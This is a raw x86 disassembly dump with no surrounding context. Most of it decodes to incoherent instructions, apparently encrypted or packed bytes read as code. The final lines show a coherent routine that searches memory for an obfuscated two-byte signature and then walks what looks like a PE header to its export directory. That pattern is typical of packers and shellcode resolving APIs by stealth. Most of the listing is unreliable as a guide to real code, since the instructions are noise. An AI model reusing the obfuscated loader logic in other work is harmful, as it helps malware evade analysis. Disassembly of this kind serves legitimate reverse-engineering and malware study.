  4195eb:	xor    ecx,DWORD PTR [edx-0x15417f22]
  4195f1:	rcl    BYTE PTR [edx-0x7],1
  4195f4:	adc    ah,BYTE PTR [edi]
  4195f6:	mov    esi,eax
  4195f8:	aaa    
  4195f9:	and    DWORD PTR [edx+0x58f4280c],edi
  4195ff:	xchg   esp,ecx
  419601:	jb     0x4195f3
  419603:	adc    BYTE PTR [edi-0x70],0xd4
  419607:	mov    eax,0x617052b1
  41960c:	imul   edx,DWORD PTR [ebp+0x51e8e9be],0xdfb184e0
  419616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419617:	push   edx
  419618:	cs and eax,0xbfb39ed3
  41961e:	rcr    DWORD PTR [edi-0x4e63216],cl
  419624:	mov    DWORD PTR [edi+0x45],ebp
  419627:	push   edi
  419628:	sbb    DWORD PTR [ebp+0x6c],edx
  41962b:	fadd   DWORD PTR fs:[ebp-0x1fe38f57]
  419632:	xor    al,0x66
  419634:	push   ebp
  419635:	xchg   BYTE PTR [esi],dl
  419637:	mov    edi,0x8324b23
  41963c:	adc    al,0xb3
  41963e:	test   al,0xde
  419640:	(bad)  
  419641:	ret    0x533f
  419644:	dec    ebx
  419645:	jo     0x419692
  419647:	jmp    0xbea3:0x1bc5a4fa
  41964e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41964f:	stos   BYTE PTR es:[edi],al
  419650:	xlat   BYTE PTR cs:[ebx]
  419652:	sub    BYTE PTR [eax-0x54],bl
  419655:	xor    BYTE PTR [edi],ch
  419657:	xchg   edx,eax
  419658:	mov    ecx,0x9493a228
  41965d:	pushf  
  41965e:	pop    ecx
  41965f:	cwde   
  419660:	fwait
  419661:	out    dx,al
  419662:	xlat   BYTE PTR ds:[ebx]
  419663:	xchg   DWORD PTR [ecx-0x790a08fa],edi
  419669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41966a:	arpl   bp,ax
  41966c:	fmul   st,st(0)
  41966e:	vandnps ymm3,ymm3,ymm2
  419672:	cmp    dh,BYTE PTR [ebx*8+0x69bb60f]
  419679:	leave  
  41967a:	mov    BYTE PTR [ebx],ch
  41967c:	sahf   
  41967d:	dec    edx
  41967e:	ret    0xdbdc
  419681:	ds mov esi,0x6a45970
  419687:	ret    0x4761
  41968a:	xchg   esp,eax
  41968b:	ins    DWORD PTR es:[edi],dx
  41968c:	push   eax
  41968d:	push   ecx
  41968e:	test   DWORD PTR [ecx-0x3010c77d],0x8d03b1c6
  419698:	push   eax
  419699:	fld    DWORD PTR [edi+0x55]
  41969c:	cld    
  41969d:	xchg   edi,eax
  41969e:	xor    al,0x9b
  4196a0:	pop    edx
  4196a1:	xor    DWORD PTR fs:[ebx+ebx*4],0x16e7d5a7
  4196a9:	or     DWORD PTR [ebx-0x78],eax
  4196ac:	and    al,0x8e
  4196ae:	loopne 0x41963a
  4196b0:	gs test bh,cl
  4196b3:	test   BYTE PTR [ecx],ah
  4196b5:	mov    edi,0xf10249b1
  4196ba:	(bad)  [edx-0x4c218fb3]
  4196c0:	xor    ah,bh
  4196c2:	add    ecx,ebp
  4196c4:	push   ebp
  4196c5:	mov    BYTE PTR [ebx+0x3e],cl
  4196c8:	mov    dh,0x2b
  4196ca:	adc    DWORD PTR [esi],ecx
  4196cc:	xchg   ecx,eax
  4196cd:	push   esi
  4196ce:	lods   al,BYTE PTR ds:[esi]
  4196cf:	(bad)  
  4196d0:	rol    BYTE PTR [edi-0x74],cl
  4196d3:	dec    ebp
  4196d4:	fcmovu st,st(3)
  4196d6:	call   0x28c4c999
  4196db:	and    DWORD PTR [ecx-0x69],0xffffffa9
  4196df:	push   edx
  4196e0:	inc    edi
  4196e1:	mov    ch,0x2
  4196e3:	jnp    0x419691
  4196e5:	and    eax,0xb919dd9a
  4196ea:	sti    
  4196eb:	repz mov tr5,eax
  4196ef:	data16 adc al,0x71
  4196f2:	jmp    0x42e:0xa511975
  4196f9:	dec    esp
  4196fa:	cmp    al,0x99
  4196fc:	mov    ds:0x6dbbe927,eax
  419701:	dec    esi
  419702:	leave  
  419703:	xor    ah,ch
  419705:	mov    ah,0x11
  419707:	daa    
  419708:	ins    BYTE PTR es:[edi],dx
  419709:	push   ds
  41970a:	sbb    DWORD PTR ds:0xa45911a,0xeb7630ec
  419714:	xor    ah,BYTE PTR [esi-0x6]
  419717:	jmp    0x6de0765
  41971c:	aaa    
  41971d:	mov    edi,0xc9f5f7a4
  419722:	push   ecx
  419723:	jp     0x41974a
  419725:	jne    0x4196c3
  419727:	lods   eax,DWORD PTR ds:[esi]
  419728:	(bad)  
  419729:	jns    0x4196d7
  41972b:	sahf   
  41972c:	xchg   esp,eax
  41972d:	xchg   ebp,eax
  41972e:	mov    ebp,0xd65b28cc
  419733:	adc    esp,DWORD PTR [eax+eax*1-0x58]
  419737:	mov    ah,0x6f
  419739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41973a:	jno    0x4196fa
  41973c:	add    ecx,DWORD PTR [eax+0x7]
  41973f:	xchg   edi,eax
  419740:	les    esp,FWORD PTR [edx]
  419742:	dec    ecx
  419743:	scas   eax,DWORD PTR es:[edi]
  419744:	mov    ch,0x36
  419746:	dec    esi
  419747:	sbb    ch,BYTE PTR [edx+0x232b18ec]
  41974d:	xlat   BYTE PTR ds:[ebx]
  41974e:	test   DWORD PTR [esi+ebp*1+0x9391a56],ebx
  419755:	hlt    
  419756:	inc    ebp
  419757:	adc    BYTE PTR [edi-0x14],bl
  41975a:	outs   dx,BYTE PTR ds:[esi]
  41975b:	xchg   esi,eax
  41975c:	cmc    
  41975d:	mov    ah,0xd5
  41975f:	jbe    0x4197bf
  419761:	retf   
  419762:	dec    ecx
  419763:	cmc    
  419764:	mov    bl,0xa1
  419766:	mov    ecx,fs
  419768:	push   ss
  419769:	stos   BYTE PTR es:[edi],al
  41976a:	outs   dx,BYTE PTR ds:[esi]
  41976b:	xchg   esi,eax
  41976c:	sar    ebx,0xc0
  41976f:	mov    al,0x55
  419771:	mov    bh,0x8
  419773:	out    dx,eax
  419774:	lds    esp,FWORD PTR ds:0xbea34dee
  41977a:	push   ds
  41977b:	mov    ebx,0xd42889bf
  419780:	dec    eax
  419781:	dec    eax
  419782:	or     DWORD PTR [esi+0x23],edx
  419785:	pop    ebp
  419786:	or     DWORD PTR [edi-0x3e1a16ce],edx
  41978c:	les    edi,FWORD PTR ds:0xd739d8cf
  419792:	pop    ebx
  419793:	inc    edx
  419794:	cmp    eax,0x3aedd6f
  419799:	add    DWORD PTR [edx],eax
  41979b:	dec    eax
  41979c:	xlat   BYTE PTR ds:[ebx]
  41979d:	cmc    
  41979e:	arpl   WORD PTR [ecx+0x54e5c90d],di
  4197a4:	adc    al,0x94
  4197a6:	xchg   dh,ch
  4197a8:	ret    
  4197a9:	(bad)  
  4197aa:	xchg   ecx,eax
  4197ab:	popa   
  4197ac:	sub    dh,cl
  4197ae:	xchg   BYTE PTR [edx],dh
  4197b0:	pop    esi
  4197b1:	add    eax,esi
  4197b3:	enter  0x2522,0xbe
  4197b7:	loope  0x419741
  4197b9:	sub    DWORD PTR [ecx+ebx*1],ebx
  4197bc:	push   esp
  4197bd:	ins    BYTE PTR es:[edi],dx
  4197be:	add    ch,al
  4197c0:	loop   0x419754
  4197c2:	mov    cl,0x63
  4197c4:	xlat   BYTE PTR ds:[ebx]
  4197c5:	jmpw   0xc8ce
  4197c9:	nop
  4197ca:	add    eax,0xe7945ed0
  4197cf:	lds    eax,FWORD PTR [ebx+0x5]
  4197d2:	jle    0x4197dc
  4197d4:	and    eax,0x5335a927
  4197d9:	ss mov ebp,0x3b42dedc
  4197df:	sti    
  4197e0:	mov    esi,0x3a937ccb
  4197e5:	test   DWORD PTR [edx],edx
  4197e7:	pop    esi
  4197e8:	or     ah,bh
  4197ea:	ret    0xd99a
  4197ed:	xchg   ebx,eax
  4197ee:	adc    dh,BYTE PTR [esi-0x51]
  4197f1:	pop    ebp
  4197f2:	int3   
  4197f3:	pusha  
  4197f4:	push   ebx
  4197f5:	pop    esi
  4197f6:	out    0xac,eax
  4197f8:	stos   BYTE PTR es:[edi],al
  4197f9:	ss jl  0x41980a
  4197fc:	ficomp DWORD PTR [ebp-0x1b]
  4197ff:	lds    ecx,FWORD PTR [edx+0xb]
  419802:	or     DWORD PTR [eax-0x5d],ebx
  419805:	aaa    
  419806:	adc    eax,0x5d949b05
  41980b:	test   eax,0x9542361c
  419810:	push   ds
  419811:	jp     0x4197a3
  419813:	(bad)  
  419814:	icebp  
  419815:	xchg   edi,eax
  419816:	(bad)  
  419817:	fld    TBYTE PTR [ebx]
  419819:	xor    BYTE PTR [ecx+0x15af8247],dl
  41981f:	rcl    BYTE PTR ds:0x42cc8354,1
  419825:	aaa    
  419826:	dec    esi
  419827:	inc    edx
  419828:	inc    ecx
  419829:	mov    ?,edi
  41982b:	(bad)  
  41982c:	xchg   edi,eax
  41982d:	pop    esi
  41982e:	xchg   ch,bl
  419830:	jmp    0x419879
  419832:	stc    
  419833:	test   al,0x77
  419835:	push   0xffffffff
  419837:	sahf   
  419838:	xor    eax,0x67000064
  41983d:	lods   eax,DWORD PTR ds:[esi]
  41983e:	mov    cl,ch
  419840:	ret    0x5259
  419843:	xchg   edi,eax
  419844:	clc    
  419845:	cmp    al,BYTE PTR [edi]
  419847:	daa    
  419848:	xor    eax,DWORD PTR [ebx]
  41984a:	js     0x419814
  41984c:	out    0x50,eax
  41984e:	mov    ds:0x1e525c24,eax
  419853:	pop    ss
  419854:	leave  
  419855:	add    DWORD PTR [edx+0x3d],esp
  419858:	lods   eax,DWORD PTR ds:[esi]
  419859:	fwait
  41985a:	xchg   esp,eax
  41985b:	dec    ebp
  41985c:	test   BYTE PTR [esi+0x4a],dh
  41985f:	sub    eax,0x5ad7ca58
  419864:	fdivr  DWORD PTR [edx-0x74]
  419867:	cmp    eax,0x13f86123
  41986c:	fdivr  QWORD PTR [ebp+0x535bcc6]
  419872:	lods   eax,DWORD PTR ds:[esi]
  419873:	push   es
  419874:	push   edx
  419875:	mov    dl,0x46
  419877:	test   al,0xac
  419879:	pop    edx
  41987a:	lods   al,BYTE PTR ds:[esi]
  41987b:	icebp  
  41987c:	lahf   
  41987d:	mov    bl,0x73
  41987f:	inc    eax
  419880:	sbb    edi,DWORD PTR [ecx+0x6c3a7e8e]
  419886:	or     BYTE PTR [edi+ebx*2-0x3d],cl
  41988a:	bound  ebp,QWORD PTR [esi]
  41988c:	dec    edi
  41988d:	aas    
  41988e:	jbe    0x41983a
  419890:	sub    al,0x5f
  419892:	scas   eax,DWORD PTR es:[edi]
  419893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419894:	fs loope 0x4198e0
  419897:	repnz iret 
  419899:	in     eax,0xcb
  41989b:	add    al,0x36
  41989d:	mov    edx,0x637a03ea
  4198a3:	aas    
  4198a4:	ins    BYTE PTR es:[edi],dx
  4198a5:	dec    eax
  4198a6:	inc    edi
  4198a7:	jnp    0x419891
  4198a9:	out    0x4a,eax
  4198ab:	pop    ss
  4198ac:	(bad)  
  4198ad:	in     al,0xa1
  4198af:	fbstp  TBYTE PTR [edi-0x2b]
  4198b2:	lods   al,BYTE PTR ds:[esi]
  4198b3:	icebp  
  4198b4:	cmp    DWORD PTR [ecx+0x22122fa7],ecx
  4198ba:	stos   BYTE PTR es:[edi],al
  4198bb:	fs mov esi,0xfc525f65
  4198c1:	xor    edx,DWORD PTR [ebx]
  4198c3:	div    edx
  4198c5:	dec    ebp
  4198c7:	xchg   ecx,eax
  4198c8:	push   es
  4198c9:	mov    ch,0x11
  4198cb:	out    dx,eax
  4198cc:	out    0xf6,al
  4198ce:	iret   
  4198cf:	ins    DWORD PTR es:[edi],dx
  4198d0:	dec    esp
  4198d1:	int    0x72
  4198d3:	push   ss
  4198d4:	sub    DWORD PTR [ecx],ecx
  4198d6:	jo     0x419952
  4198d8:	xor    bl,dl
  4198da:	je     0x4198c2
  4198dc:	pop    ebx
  4198dd:	shl    ah,cl
  4198df:	push   ebx
  4198e0:	mov    edx,0x85e719e1
  4198e5:	js     0x4198fc
  4198e7:	jg     0x4198d0
  4198e9:	jb     0x41995d
  4198eb:	out    0x30,al
  4198ed:	xchg   esi,eax
  4198ee:	leave  
  4198ef:	pusha  
  4198f0:	loopne 0x4198de
  4198f2:	pop    es
  4198f3:	dec    esi
  4198f4:	fwait
  4198f5:	add    cl,BYTE PTR [edi+0x1fce817e]
  4198fb:	xor    edi,ecx
  4198fd:	sar    ebx,cl
  4198ff:	mov    ch,0xea
  419901:	sahf   
  419902:	adc    ah,BYTE PTR [ecx-0x1ef9a26f]
  419908:	mov    WORD PTR [edx+0x3f3cc9b9],gs
  41990e:	mov    bl,0x3c
  419910:	dec    edx
  419911:	sub    BYTE PTR [ebx+0x715d0cf0],ch
  419917:	stc    
  419918:	adc    dl,BYTE PTR [ecx+ebp*2+0x39]
  41991c:	or     ah,BYTE PTR [ecx+edx*4]
  41991f:	cmp    al,0x3a
  419921:	pop    ebp
  419922:	aaa    
  419923:	fsubr  QWORD PTR ds:0xe2985d1e
  419929:	pop    esp
  41992a:	ret    
  41992b:	data16 in al,dx
  41992d:	out    dx,al
  41992e:	ror    DWORD PTR [eax],0x64
  419931:	jl     0x41994f
  419933:	cmc    
  419934:	ret    0x377f
  419937:	pop    ebx
  419938:	adc    eax,0xd7c78e12
  41993d:	push   eax
  41993e:	lods   eax,DWORD PTR ds:[esi]
  41993f:	push   edi
  419940:	dec    ebx
  419941:	std    
  419942:	in     al,dx
  419943:	push   es
  419944:	daa    
  419945:	xchg   ebx,eax
  419946:	cmp    esi,DWORD PTR [ecx]
  419948:	ja     0x419971
  41994a:	leave  
  41994b:	scas   al,BYTE PTR es:[edi]
  41994c:	popf   
  41994d:	pop    esi
  41994e:	scas   al,BYTE PTR es:[edi]
  41994f:	dec    ecx
  419950:	mov    bl,0x9b
  419952:	je     0x4198d8
  419954:	data16 loopne 0x419930
  419957:	push   esi
  419958:	sub    BYTE PTR [ecx+0x39],ah
  41995b:	les    eax,FWORD PTR [eax]
  41995d:	cwde   
  41995e:	xor    al,0x98
  419960:	nop    DWORD PTR [ecx]
  419963:	dec    esp
  419964:	sub    al,0xb3
  419966:	mov    esp,0x8c9a846a
  41996b:	cmp    eax,0x4fb11dae
  419970:	xchg   esi,eax
  419971:	cmp    al,0x37
  419973:	cmp    bl,BYTE PTR [ebx-0x4a3ad6d6]
  419979:	sbb    dl,BYTE PTR [ebx+0x2]
  41997c:	jno    0x41998b
  41997e:	cmp    esp,ebp
  419980:	shr    DWORD PTR [ebx+0x1],1
  419983:	fist   WORD PTR [ebx-0x77]
  419986:	ror    DWORD PTR [edx+edx*4+0x2c],0xf8
  41998b:	mov    ch,0xfa
  41998d:	(bad)  
  41998e:	mov    ch,0xde
  419990:	repnz xor ch,BYTE PTR [ebx]
  419993:	popf   
  419994:	push   esi
  419995:	out    0xac,eax
  419997:	aaa    
  419998:	ss cmc 
  41999a:	adc    al,0xdf
  41999c:	dec    edi
  41999d:	sub    edx,ebp
  41999f:	push   ds
  4199a0:	push   es
  4199a1:	xor    edx,esp
  4199a3:	adc    DWORD PTR [eax-0x79],eax
  4199a6:	sti    
  4199a7:	mov    cl,0xb7
  4199a9:	mov    al,0x22
  4199ab:	sub    eax,0xf92bbb63
  4199b0:	sbb    al,0xfd
  4199b2:	mov    dl,0x2
  4199b4:	test   BYTE PTR [ebx-0x75790f16],ch
  4199ba:	mov    edx,0x7dd849af
  4199bf:	loopne 0x4199ec
  4199c1:	cli    
  4199c2:	push   eax
  4199c3:	xchg   esp,eax
  4199c4:	xor    cl,BYTE PTR [edi+0x61d60b6b]
  4199ca:	mul    DWORD PTR [ebx-0x78]
  4199cd:	in     al,dx
  4199ce:	cmp    al,0x94
  4199d0:	mov    bh,dh
  4199d2:	mov    esi,0xf4a659f6
  4199d7:	ret    
  4199d8:	retf   
  4199d9:	sub    BYTE PTR ds:0xa403ba,0xac
  4199e0:	mov    DWORD PTR [eax+0x6d],esp
  4199e3:	mov    edi,DWORD PTR [esi-0x12]
  4199e6:	(bad)  
  4199e7:	cmp    esp,DWORD PTR ds:0xaca73a98
  4199ed:	inc    edi
  4199ee:	in     eax,0x6e
  4199f0:	mov    al,0xcf
  4199f2:	cs aad 0x93
  4199f5:	ins    BYTE PTR es:[edi],dx
  4199f6:	cmp    eax,0x9cbbafa5
  4199fb:	das    
  4199fc:	pop    edi
  4199fd:	sub    dh,BYTE PTR [ebx-0x31]
  419a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a01:	loop   0x4199f9
  419a03:	js     0x419997
  419a05:	add    BYTE PTR [ebp+0x2a4b71ee],dl
  419a0b:	sti    
  419a0c:	xor    eax,0x4ef8268d
  419a11:	inc    edi
  419a12:	pusha  
  419a13:	dec    esp
  419a14:	inc    edi
  419a15:	cmp    DWORD PTR [ebx],ebp
  419a17:	fwait
  419a18:	xlat   BYTE PTR ds:[ebx]
  419a19:	fcomip st,st(3)
  419a1b:	fisttp QWORD PTR [ebx+0x6cd85ae6]
  419a21:	fbld   TBYTE PTR [ebp-0x4d6b4fc8]
  419a27:	in     eax,0x1a
  419a29:	hlt    
  419a2a:	dec    bh
  419a2c:	add    BYTE PTR [edi],al
  419a2e:	push   0x52
  419a30:	jo     0x419a30
  419a32:	mov    dh,0x22
  419a34:	out    dx,eax
  419a35:	ins    DWORD PTR es:[edi],dx
  419a36:	cdq    
  419a37:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  419a39:	retf   
  419a3a:	xchg   edx,eax
  419a3b:	add    DWORD PTR [ecx],ebx
  419a3d:	jno    0x419aa7
  419a3f:	aad    0x22
  419a41:	add    bh,dl
  419a43:	std    
  419a44:	push   ebp
  419a45:	adc    bl,dh
  419a47:	(bad)  
  419a48:	test   al,0x42
  419a4a:	std    
  419a4b:	(bad)  
  419a4c:	sbb    al,0x6
  419a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a4f:	and    eax,0x697be2ba
  419a54:	inc    edi
  419a55:	mov    eax,ds:0x200a7352
  419a5a:	leave  
  419a5b:	add    BYTE PTR [edx-0x2143576b],bl
  419a61:	ret    
  419a62:	pop    esp
  419a63:	xor    DWORD PTR [ebp+0x58],edx
  419a66:	std    
  419a67:	sub    BYTE PTR [edx],cl
  419a69:	icebp  
  419a6a:	sahf   
  419a6b:	(bad)  
  419a6c:	mov    edi,0xa1467138
  419a71:	test   eax,0x5d832a77
  419a76:	pushf  
  419a77:	sbb    BYTE PTR [esi],dh
  419a79:	jae    0x419a8f
  419a7b:	int3   
  419a7c:	xchg   BYTE PTR [eax],ah
  419a7e:	daa    
  419a7f:	mov    WORD PTR [esi+ebp*1-0x8695dd9],fs
  419a86:	stc    
  419a87:	adc    DWORD PTR [esp+ebp*8-0x36],0x40a2916f
  419a8f:	(bad)  
  419a90:	inc    ebx
  419a91:	ror    DWORD PTR [ecx+0x656ee000],0x9d
  419a98:	out    dx,al
  419a99:	ficom  WORD PTR [edi]
  419a9b:	daa    
  419a9c:	sbb    DWORD PTR [esi],edx
  419a9e:	test   al,0x50
  419aa0:	aaa    
  419aa1:	and    bl,cl
  419aa3:	test   DWORD PTR [edx],eax
  419aa5:	mov    eax,0xe8a2f93
  419aaa:	fcom   DWORD PTR [ebp+0x7e64dc10]
  419ab0:	mov    ds:0xb07536ab,eax
  419ab5:	and    cl,BYTE PTR [edx+ebx*8+0x2fae99ae]
  419abc:	jnp    0x419adb
  419abe:	or     al,0xc3
  419ac0:	inc    ebx
  419ac1:	dec    edi
  419ac2:	pop    edx
  419ac3:	cli    
  419ac4:	dec    edi
  419ac5:	or     al,ch
  419ac7:	mov    al,0xe3
  419ac9:	mov    al,0xa6
  419acb:	jae    0x419b30
  419acd:	test   BYTE PTR [edx],ah
  419acf:	jl     0x419b2b
  419ad1:	inc    eax
  419ad2:	fistp  QWORD PTR [ebp+0x55]
  419ad5:	or     BYTE PTR [ebx],0xf3
  419ad8:	pop    esp
  419ad9:	pop    ebp
  419ada:	inc    eax
  419adb:	xchg   esi,eax
  419adc:	and    al,ch
  419ade:	pop    ss
  419adf:	dec    esi
  419ae0:	xor    DWORD PTR [esp+esi*8-0x7d5ebe17],0xfffffffe
  419ae8:	icebp  
  419ae9:	adc    eax,0xebec13a4
  419aee:	mov    DWORD PTR [edx+0x53],ecx
  419af1:	dec    edi
  419af2:	pop    esp
  419af3:	fcmovne st,st(4)
  419af5:	jns    0x419aa5
  419af7:	xchg   ecx,eax
  419af8:	test   BYTE PTR [esp+edi*2],cl
  419afb:	jg     0x419b1d
  419afd:	cdq    
  419afe:	(bad)  
  419aff:	mov    ds:0x90294b7a,al
  419b04:	aas    
  419b05:	jno    0x419a8e
  419b07:	mov    eax,0xbf4d3a3
  419b0c:	jno    0x419b59
  419b0e:	outs   dx,DWORD PTR ds:[esi]
  419b0f:	dec    esi
  419b10:	pop    esp
  419b11:	add    al,al
  419b13:	loop   0x419a98
  419b15:	xchg   ebx,eax
  419b16:	sahf   
  419b17:	cli    
  419b18:	mov    ch,0xc7
  419b1a:	push   es
  419b1b:	push   es
  419b1c:	mov    DWORD PTR [ecx],ebp
  419b1e:	xchg   esp,eax
  419b1f:	push   esp
  419b20:	mov    bh,0x3a
  419b22:	push   edi
  419b23:	jl     0x419af6
  419b25:	stc    
  419b26:	push   ecx
  419b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b28:	add    BYTE PTR [eax+0x3c2ec25a],bh
  419b2e:	inc    esp
  419b2f:	mov    bh,0x51
  419b31:	dec    esp
  419b32:	mov    al,0x12
  419b34:	setb   BYTE PTR [esi-0x2f]
  419b38:	adc    bh,dh
  419b3a:	push   es
  419b3b:	imul   ecx,DWORD PTR [eax-0x46],0x2752d56e
  419b42:	mov    DWORD PTR [eax],esi
  419b44:	xchg   DWORD PTR [edi*2+0x276d127a],ebp
  419b4b:	shl    BYTE PTR ss:[ebp+0xb],cl
  419b4f:	jmp    0xbf68:0x8ee24156
  419b56:	imul   eax,edx,0xd751413c
  419b5c:	mov    edx,0x3a23832e
  419b61:	sbb    BYTE PTR [ebx+edx*4+0x72014cac],0x56
  419b69:	cmc    
  419b6a:	mov    edi,0x2b23f52
  419b6f:	pop    esp
  419b70:	pop    ss
  419b71:	inc    eax
  419b72:	inc    esp
  419b73:	cmp    BYTE PTR [eax],dl
  419b75:	in     eax,dx
  419b76:	adc    BYTE PTR cs:[ebx-0x58c02dcd],0xe8
  419b7e:	inc    edi
  419b7f:	jl     0x419bdb
  419b81:	add    DWORD PTR [esi+0x20],ebx
  419b84:	loop   0x419be6
  419b86:	pop    ebp
  419b87:	adc    edx,ebx
  419b89:	jno    0x419b75
  419b8b:	mov    esi,0xfdb26d8d
  419b90:	lahf   
  419b91:	inc    ecx
  419b92:	mov    bh,0xc8
  419b94:	jmp    0xe22478d
  419b99:	dec    ebp
  419b9a:	xor    al,0xfe
  419b9c:	fnstsw ax
  419b9e:	fiadd  WORD PTR [esi-0x4f]
  419ba1:	xchg   ebx,eax
  419ba2:	nop
  419ba3:	cs mov ebp,0x2ebc0f5f
  419ba9:	mov    dh,0x2e
  419bab:	inc    esp
  419bac:	inc    ebx
  419bad:	sbb    edi,edx
  419baf:	aad    0xd8
  419bb1:	xor    al,0xf3
  419bb3:	cmp    BYTE PTR [eax+0x6f],0x3b
  419bb7:	outs   dx,DWORD PTR ds:[esi]
  419bb8:	ins    DWORD PTR es:[edi],dx
  419bb9:	neg    BYTE PTR [ecx-0x7c]
  419bbc:	(bad)  
  419bbd:	xchg   ebx,eax
  419bbe:	arpl   cx,si
  419bc0:	mov    ah,0xf6
  419bc2:	push   esp
  419bc3:	loopne 0x419c34
  419bc5:	and    ecx,esi
  419bc7:	jae    0x419b90
  419bc9:	(bad)
  419bcc:	ret    
  419bcd:	stc    
  419bce:	je     0x419bfc
  419bd0:	jno    0x419bb9
  419bd2:	int    0xff
  419bd4:	sub    ecx,DWORD PTR [esi+0x48]
  419bd7:	loopne 0x419b90
  419bd9:	out    dx,al
  419bda:	test   al,0xe6
  419bdc:	aas    
  419bdd:	push   es
  419bde:	shl    bh,1
  419be0:	sub    al,bl
  419be2:	js     0x419bc5
  419be4:	inc    edi
  419be5:	and    DWORD PTR [eax+0x16],esi
  419be8:	cwde   
  419be9:	sbb    BYTE PTR [ecx],cl
  419beb:	cld    
  419bec:	push   eax
  419bed:	pop    es
  419bee:	fsub   st(1),st
  419bf0:	pop    edx
  419bf1:	clc    
  419bf2:	mov    cl,0x50
  419bf4:	pop    eax
  419bf5:	das    
  419bf6:	adc    DWORD PTR [edx],0x5b
  419bf9:	mov    ah,0x25
  419bfb:	inc    ebp
  419bfc:	adc    bh,BYTE PTR [ebp+0x19ae4aa4]
  419c02:	fdivr  DWORD PTR [ebx]
  419c04:	retf   
  419c05:	and    eax,ebx
  419c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c08:	out    0x14,al
  419c0a:	sub    dh,dl
  419c0c:	mov    ebp,0xa17094fa
  419c11:	ins    DWORD PTR es:[edi],dx
  419c12:	cwde   
  419c13:	push   cs
  419c14:	add    BYTE PTR [edi-0x3b],bl
  419c17:	mov    esi,0x87759ed2
  419c1c:	jmp    0x4f180447
  419c21:	lods   al,BYTE PTR ds:[esi]
  419c22:	and    eax,DWORD PTR [edx]
  419c24:	call   0x67b4ec99
  419c29:	repz add eax,edi
  419c2c:	fild   DWORD PTR [esi-0x44]
  419c2f:	or     ch,BYTE PTR [eax+0x3dcd809a]
  419c35:	sbb    dl,BYTE PTR [esi-0x26]
  419c38:	push   0x67
  419c3a:	sub    DWORD PTR [edi-0x6ce4c1],esi
  419c40:	fisubr WORD PTR [ebx+0x3a615fa8]
  419c46:	and    al,BYTE PTR [edi]
  419c48:	inc    esp
  419c49:	inc    edx
  419c4a:	dec    ebp
  419c4b:	or     al,0xaf
  419c4d:	jo     0x419c85
  419c4f:	popa   
  419c50:	es push edx
  419c52:	dec    ebx
  419c53:	neg    ch
  419c55:	mov    BYTE PTR [ecx+0x45],dl
  419c58:	inc    ecx
  419c59:	push   eax
  419c5a:	pop    edi
  419c5b:	jne    0x419c4d
  419c5d:	imul   edi,DWORD PTR [eax+edi*1+0x51],0xfa191281
  419c65:	in     al,0xe3
  419c67:	fndisi(8087 only) 
  419c69:	mov    ecx,0x9d27f37f
  419c6e:	xor    esp,DWORD PTR [edi]
  419c70:	leave  
  419c71:	jmp    0xdba0:0xda474212
  419c78:	(bad)  
  419c79:	inc    esp
  419c7a:	in     eax,dx
  419c7b:	push   ecx
  419c7c:	popa   
  419c7d:	or     eax,0x72b0d03c
  419c82:	cs or  al,0xb3
  419c85:	add    edx,0x390ba597
  419c8b:	call   0xb152:0xa36f5701
  419c92:	and    al,0x2a
  419c94:	mov    al,0xe6
  419c96:	inc    ebx
  419c97:	das    
  419c98:	shl    eax,cl
  419c9a:	pop    ebx
  419c9b:	jbe    0x419cd6
  419c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c9e:	repz and bl,al
  419ca1:	and    BYTE PTR [edx+0x7e777406],dl
  419ca7:	arpl   WORD PTR [ecx-0x44],cx
  419caa:	sbb    ah,al
  419cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cad:	repz add dl,al
  419cb0:	cdq    
  419cb1:	adc    DWORD PTR [eax],0x36
  419cb4:	xchg   edx,eax
  419cb6:	leave  
  419cb7:	or     eax,0x81da49e1
  419cbc:	mov    al,ds:0xf501efb0
  419cc1:	xor    eax,0x48b3508a
  419cc6:	inc    ecx
  419cc7:	int3   
  419cc8:	pop    esp
  419cc9:	call   0x174f6815
  419cce:	pop    esp
  419ccf:	out    dx,eax
  419cd0:	push   cs
  419cd1:	shl    BYTE PTR [ebp-0x2d7be94],cl
  419cd7:	ins    BYTE PTR es:[edi],dx
  419cd8:	ror    BYTE PTR [edi+0x4b],cl
  419cdb:	hlt    
  419cdc:	push   0xace35cc
  419ce1:	pop    es
  419ce2:	popa   
  419ce3:	cmp    eax,0x1503545e
  419ce8:	imul   ebp,DWORD PTR [edi],0xffffffa1
  419ceb:	sub    BYTE PTR [ebx+0x7d8bd85d],cl
  419cf1:	fsub   QWORD PTR [ebx]
  419cf3:	(bad)  
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
